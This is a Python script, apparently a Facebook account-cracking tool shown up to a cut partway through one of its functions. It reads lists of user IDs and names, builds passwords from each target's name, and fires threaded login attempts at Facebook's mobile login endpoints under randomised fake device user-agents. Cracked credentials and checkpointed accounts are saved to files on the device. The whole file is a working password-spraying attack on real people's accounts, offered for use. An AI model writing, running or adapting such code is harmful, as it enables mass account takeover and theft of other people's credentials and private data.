from os import path
import os,base64,zlib,pip,urllib,time
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L61; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SO-01M Build/55.2.D.0.389) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/308.0.0.42.118;]"}
for _ in range(1000):
    ver = ['7','7.1','8','8.1','9','10','11','12','13']
    mod = ['SM-A320FL','Honor 3X','Honor 6x','Lumia 710','Moto G3','Moto G4','Note 5 Pro','SAMSUNG SM-A326B','One M9','One Mini 2','Omnia 7','Note 5 Lite','Redmi Note 9 Pro 5G','Redmi Note10T','Redmi Note7','Redmi S2','Redmi Note 12 Pro+','SAMSUNG SM-A536B','SAMSUNG SM-A526U','Redmi Note 13','SAMSUNG SM-N985F','Redmi Note 12','SAMSUNG SM-M225FV','SAMSUNG SM-G998B','SAMSUNG SM-N975F','SAMSUNG SM-M215F','Redmi Note 11 Pro','Primo R10','SAMSUNG SM-A336B','Primo R3','Primo S8','Primo RM2','Primo GH6','Primo N5','SAMSUNG SM-A226B','Primo H8 Pro','Primo H10','A2860','RX7 Mini','Primo H10','Primo EF9','Symphony Z18','Symphony Z18','Symphony Z60','Symphony Z50','Symphony Z32','Symphony Z45','P960','TECNO KH7','TECNO BF7','TECNO CG8','TECNO LG7n','TECNO LG6n','TECNO AC8','SM-A245M','SM-A307FN','SM-A336B','SM-G780F','Redmi Note 10 Lite','SHARK PAR-H0','MiTV-AYFR0',' Redmi Note 7',' Redmi Note 7 Pro',' Redmi Note 8',' Redmi Note 8 Pro',' Redmi Note 4X','S720','Xperia M2','Y71','X6 Plus','X60 Pro','X70 5G','X70 Pro+','iQOO Neo 5 SE','Y12','IV','V2143','V2143','Realme C53','Realme Narzo N53','Realme 11 Pro+','Realme 11','Realme Narzo N55','Realme GT','Realme 10T','Realme C33','Realme C55','Realme GT Neo','Realme V30','Realme 10s','Realme V20','Realme 10 Pro+','Realme 10 Pro','Realme 10','Realme 10','Realme C30s','Realme C33','Realme 9i','Realme Narzo 50 Pro 5','Realme Narzo 50 5G','Realme 9 5G','Realme V23i','Xiaomi Redmi Note 12 Pro','Xiaomi Redmi Note 12','Xiaomi Redmi A2+','Xiaomi Redmi A2','Xiaomi Redmi Note 12','Xiaomi 13 Pro','Xiaomi 13','Xiaomi 13 Lite','Xiaomi Poco C55','Xiaomi Poco X5 Pro','Xiaomi Poco X5','Xiaomi Redmi Note 12','Xiaomi Poco C50','Xiaomi Redmi Note 12 Pro','Xiaomi Redmi K60 Pro','Xiaomi Redmi K60E','Xiaomi Redmi K60','Xiaomi Redmi 12C','Xiaomi Redmi Note 12','Xiaomi Redmi Note 12 Pro+','Xiaomi 12T Pro','Xiaomi 12T','Xiaomi Redmi Note 11R','Xiaomi Redmi A1+''Z3351S','22071219AI','AGM_H5','itelL5006C','POCOX5Pro5G','ArmorX5Pro','KINGKONGMINI2','SAMSUNGSM-A515F','itelS661W','itelW6502','itelW5504','itelA662L','itelA571W','itelP651W','itelP662L','itelP681L','itelL6004L','itelA507LM','itelA661L','SM-A013M','LG-M250','NRD90U','V2237','V2217','V2132','V2031A','V1914A','V2143','V2152','V2006','V2158','ACTAB1022','AcerChromebookR13','AcerChromebook14','AcerChromebook15','HTCDesire21pro5G','HTCU23Pro','HTCDesire19s','HTCU205G','U19e','U12Plus','HTC_U-1u','BNE-LX1','ANY-LX1','CET-LX9','PGT-N19','HUAWEINMO-L31','HUAWEIRIO-UL00','DUA-AL00','KOZ-AL40','ALA-AN70','L-51A','LM-K420','LGL164VL','KB2007','CPH2467','CPH2423','CPH2465','220333QPG','22041219PI','2207117BPG','21121210G','23049PCD8G','22021211RG','22111317PG','RMX3311','RMX3572','RMX3396','RMX3506','RMP2105','RMX3300','RMX3661','I2126','V2237','V2217','Pixel6Pro','Pixel7Pro'
]
    builds = [
 'LMY47D','NRD90M','N2G47O','OPR1.170623.027','PPR1.180610.011','QKQ1.190825.002','RP1A.201005.004','S737TLUDU1APL1','T822XXU1ASJ1','V417IRU1AQB9','TQ3A.230605.011','TQ2A.230505.002.A1','SP2A.220505.008','SQ3A.220605.009.A1','SD1A.210817.019.C4','RQ2A.210405.006', 'RD1A.201105.003','OPM8.190105.002','OPM3.171019.014','NJH34C','NHG47N','N2G47X','N8I11F', 'NOF26V','N4F26M','NMF26O','NDE63V','NMF26F','MMB30Y','MTC20K','LMY48G','LMY48I','LMY47X','JDQ39E','RQ2A.210505.002','PPR1.180610.011','SP1A.210812.016','RP1A.200720.011','RKQ1.201105.002','TP1A.220624.014','SP1A.210812.016','QKQ1.191215','RTT0.210630.002','QP1A.190711.020','OPM2.171019.012','TQ3A.230605.012','TQ3A.230605.011','TQ3A.230605.010','TQ2B.230505.005.A1','TD4A.221205.042.B1','TD4A.221205.042.A1','TD4A.221205.042','TQ2A.230505.002.G1','TQ2A.230505.002.A1','TQ2A.230505.002','TQ2A.230405.003.G1','TQ2A.230405.003.E1','TQ2A.230405.003.B2','TQ2A.230405.003.A2','TQ2A.230405.003','TQ2A.230305.008.F1','TQ2A.230305.008.E1','TQ2A.230305.008.C1','TQ2A.230305.008.A3','TQ2A.230305.008.A1','TQ2A.230305.008','TP1A.221005.002.B2','TQ1A.230205.002','TP1A.221105.002','TD1A.220804.031','TD1A.220804.009.A5','TD1A.220804.009.A2','TP1A.221005.003','TP1A.221005.002','TP1A.220624.014','SP2A.220505.008','SD2A.220601.004.B2','SD2A.220601.003.B1','SD2A.220601.001.B1','SQ3A.220705.004','SQ3A.220705.001.B2','SQ3A.220705.004.A1','SQ3A.220705.003.A3','SD2A.220601.003','SD2A.220601.002','SD2A.220123.051.A3','SD2A.220123.051.A2','SD2A.220123.050.A1','SD2A.220601.004','SD2A.220601.001.A1','SQ3A.220705.003.A1','SQ3A.220705.003','SQ3A.220705.001.B1','SQ3A.220605.009.B1','SQ3A.220605.009.A1','SP2A.220505.006','SP2A.220505.002','SP2A.220405.004','SP2A.220405.003','SP2A.220305.013.A3','SP2A.220305.012','10026669','9873344','9587746','9575279','9395439','SP1A.210812.016.C2','SP1A.210812.016.B2','SQ1D.220205.004','SP1A.210812.016.C1','SP1A.210812.016.B1','SQ1D.220205.003','SQ1A.220205.002','SQ1D.220105.007','SQ1A.220105.002','SP1A.210812.016.A2','SQ1D.211205.016.A5','SQ1D.211205.016.A4','SQ1D.211205.017','SQ1D.211205.016.A1','SQ1A.211205.008','SD1A.210817.037.A1','SD1A.210817.037','SD1A.210817.036.A8','SD1A.210817.036','SP1A.211105.004','SP1A.211105.003','SP1A.211105.002.A1','SP1A.211105.002','SD1A.210817.019.C4','SD1A.210817.019.C2','SD1A.210817.019.B1','SD1A.210817.015.A4','SP1A.210812.016.A1','SP1A.210812.015','RD2A.211001.002','RD2A.211001.001','RQ3A.211001.001','RD2A.210905.003','RD2A.210905.002','RQ3A.210905.001','RD2A.210605.007','RQ2A.210405.005','RQ2A.210305.007','RQ2A.210305.006','RQ1D.210205.004','RQ1C.210205.006','RQ1A.210205.004','RQ1D.210105.003','RQ1A.210105.002','RP1A.201005.004.A1','RQ1D.201205.012.A1','RQ1A.201205.003.A1','RQ1A.201205.011','RQ1A.201205.008.A1','RQ1A.201205.010','RQ1A.201205.008','RQ1A.201205.003','RP1A.201105.002','RD1B.201105.010','RD1A.201105.003.C1','RD1A.201105.003.B1','RD1A.201105.003.A1','RD1A.201105.003','RD1A.200810.022.A4','RD1A.200810.021.B3','RD1A.200810.020.A1','RD1A.200810.021.A1','RD1A.200810.020','RP1A.201005.006','RP1A.201005.001','QP1A.190711.020','SP1A.210812.016','SP1A.210812.001','PPR1.180610.011','TP1A.220624.014','SP1A.210812.003','RD2A.211001.002','RD2A.211001.001','RQ3A.211001.001','RD2A.210905.003','RD2A.210905.002','RQ3A.210905.001','RD2A.210605.007','RD2A.210605.006','RQ3A.210805.001.A1','RQ3A.210705.001','RQ3A.210605.005','RQ2A.210505.003','RQ2A.210505.002','RQ2A.210405.006','RQ2A.210405.005','RQ2A.210305.007','RQ2A.210305.006','RQ1D.210205.004','RD1A.201105.003','RD1A.200810.022.A4','RD1A.200810.021.B3','RD1A.200810.020.A1','RD1A.200810.021.A1','RD1A.200810.020','RP1A.201005.006','RP1A.201005.004','RP1A.200720.011','RP1A.200720.010','RP1A.200720.009','QD4A.200805.003','QD4A.200805.001','QD4A.200317.027','QD4A.200317.024.A1','QQ3A.200805.001','QQ3A.200705.002','QQ3A.200605.002.A1','QQ3A.200605.002','QQ3A.200605.001','QQ2A.200501.001.B3','QQ2A.200501.001.B2','QQ2A.200501.001.A3','QQ2A.200405.005','QQ2A.200305.004.A1','PQ3B.190801.002','PQ3A.190801.002','PQ3B.190705.003','PQ3A.190705.003','PQ3A.190705.001','PQ3B.190605.006','PQ3A.190605.004.A1','PQ3A.190605.003','PD2A.190115.032','PD2A.190115.029','PQ3A.190505.002','PQ3A.190505.001','PQ2A.190405.003','PQ2A.190305.002','PQ2A.190205.003','PQ2A.190205.002','PQ2A.190205.001','PQ1A.190105.004','PQ1A.181205.006.A1','OPM8.190605.005','OPM8.190605.003','OPM8.190505.001','OPM8.190405.001','OPM8.190305.001','OPM8.190205.001','OPM8.190105.002','OPM8.181205.001','OPM7.181205.001','OPM8.181105.002','OPM7.181105.004','OPM8.181005.003','OPM7.181005.003','OPM6.171019.030.K1','OPM4.171019.021.Z1','OPM6.171019.030.H1','OPM4.171019.021.Y1','OPM6.171019.030.E1','OPM4.171019.021.R1','OPM4.171019.021.Q1','OPM4.171019.021.P1','OPM4.171019.021.N1','OPM2.171026.006.H1','OPM2.171026.006.G1','OPM6.171019.030.B1','OPM4.171019.021.E1','OPM4.171019.021.D1','OPM2.171026.006.C1','OPM4.171019.016.C1','OPM4.171019.016.B1','OPM4.171019.016.A1','OPM2.171019.029.B1','OPR5.170623.014','OPR4.170623.020','OPD3.170816.023','OPD1.170816.025','OPR6.170623.023','OPR5.170623.011','OPR3.170623.013','OPR2.170623.027','OPR1.170623.032','OPD3.170816.016','OPD2.170816.015','OPD1.170816.018','OPD3.170816.012','OPD1.170816.012','OPD1.170816.011','OPD1.170816.010','OPR5.170623.007','OPR4.170623.009','NZH54D','NKG47S','NHG47Q','NJH47F','N2G48C','NZH54B','NKG47M','NJH47D','NHG47O','N2G48B','N2G47Z'
]
    a=random.randrange(100,114)
    b=random.randrange(5012,5735)
    c=random.randrange(51,124)
    ugen = []    
    for _ in range(1000):
        an_ver = random.choice(ver)
        an_mod = random.choice(mod)
        an_build = random.choice(builds)
        user_agent = f'Mozilla/5.0 (Linux; Android {an_ver}; {an_mod} Build/{an_build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{a}.0.{b}.{c} Mobile Safari/537.36'
        ugen.append(user_agent)   
                        
logo = ("""                   
    \033[0;31m╔╦╗╦ ╦╔═╗  \033[0;37m╔╦╗╔═╗╔═╗╦╔═  \033[0;34m╔╦╗╔═╗╔╗╔
     \033[0;31m║ ╠═╣║╣   \033[0;37m║║║╠═╣╚═╗╠╩╗  \033[0;34m║║║╠═╣║║║
     \033[0;31m╩ ╩ ╩╚═╝  \033[0;37m╩ ╩╩ ╩╚═╝╩ ╩  \033[0;34m╩ ╩╩ ╩╝╚╝
\x1b[1;90m══════════════════════════════════════════""")
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
plist=[]	
def menu():
		os.system('clear')
		print(logo)
		file = input(f'\x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mPUT FILE LOCATION: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' NO FILE FOUND😩 ')
			exit()
		os.system('clear')
		print(logo)
		print(f'\x1b[1;97mCHOSE YOUR METHOD: \n[1] METHOD 1 \n[2] METHOD 2 \n[3] METHOD 3 \n[4] METHOD 4 ')
		mthd=input(f'WHICH?: ')
		os.system('clear')
		print(logo)
		try:
			ps_limit = int(input(f'\x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PASSWORD LIMIT?: '))
		except:
			ps_limit =1
		for i in range(ps_limit):
			plist.append(input(f'\x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER PASSWORD {i+1}: '))
		print(f' [\033[1;32m?\033[1;37m] SHOW CP?: ')
		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		os.system('clear')
		print(logo)
		with tred(max_workers=30) as crack_submit:
			total_ids = str(len(fo))
			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			print("\x1b[1;90m══════════════════════════════════════════")
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)				
def m1(ids,names,passlist):
        global loop,oks,cps
        ua = random.choice(ugen) 
        sys.stdout.write(f'\r\r\033[1;37m [MASK] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        head = {'Host': 'm.beta.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [MASK\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/FOF•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
                        
def m3(ids,names,passlist):
        global loop,oks,cps
        ua = random.choice(ugen) 
        sys.stdout.write(f'\r\r\033[1;37m [MASK] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [MASK\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                open(f'/sdcard/FOF•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m2(ids,names,passlist):
        global loop,oks,cps
        ua = random.choice(ugen) 
        sys.stdout.write(f'\r\r\033[1;37m [MASK] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
